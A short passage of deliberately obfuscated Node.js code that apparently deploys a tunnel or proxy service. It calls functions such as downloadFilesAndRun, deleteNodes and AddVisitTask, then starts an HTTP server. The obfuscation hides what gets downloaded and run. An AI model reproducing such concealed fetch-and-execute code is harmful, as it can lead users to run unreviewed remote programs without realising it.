_0xd7b14=_0xc22f72;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x18fb05){console[_0xd7b14(0x201)](_0xd7b14(0x252),_0x18fb05);}}startserver()[_0xc22f72(0x233)](_0x4aa673=>{const _0x16ada2=_0xc22f72;console[_0x16ada2(0x201)](_0x16ada2(0x222),_0x4aa673);}),app[_0xc22f72(0x272)](PORT,()=>console[_0xc22f72(0x243)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
